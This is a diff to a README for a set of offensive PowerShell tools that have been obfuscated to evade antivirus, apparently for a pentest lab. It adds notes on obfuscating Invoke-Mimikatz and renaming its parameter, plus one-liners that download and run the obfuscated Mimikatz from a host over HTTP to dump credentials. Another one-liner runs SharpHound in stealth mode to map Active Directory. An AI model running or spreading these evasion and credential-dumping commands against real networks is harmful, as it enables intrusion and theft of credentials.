@@ -11,6 +11,9 @@ disabling RTM is for noobs
 
 ## bypasses
 
+- `Invoke-Mimimkatz`
+    - Had to add some base64-strings and change a parameter. `DumpCreds` is now `GetPwned`.
+
 - `PowerUp.ps1`
     - Removed service binaries. Hijack it yourself!
     - HTML reports removed.
@@ -51,10 +54,11 @@ iex (iwr http://172.16.100.X/PowerUp.ps1 -UseBasicParsing); Invoke-AllChecks;
 
 - Dump Creds
 ```
-iex (iwr http://172.16.100.X/Invoke-Mimikatz-OBFS.ps1 -UseBasicParsing); Invoke-Mimikatz -DumpCreds;
+iex (iwr http://172.16.100.X/Invoke-Mimikatz-OBFS.ps1 -UseBasicParsing); Invoke-Mimikatz -GetPwned;
 ```
 
 - Active Directory
+**SHARPHOUND TOUCHES DISK**
 ```
 iex (iwr http://172.16.99.77/SharpHound.ps1); Invoke-BloodHound -CollectionMethod All -Stealth -ExcludeDCs;
 ```
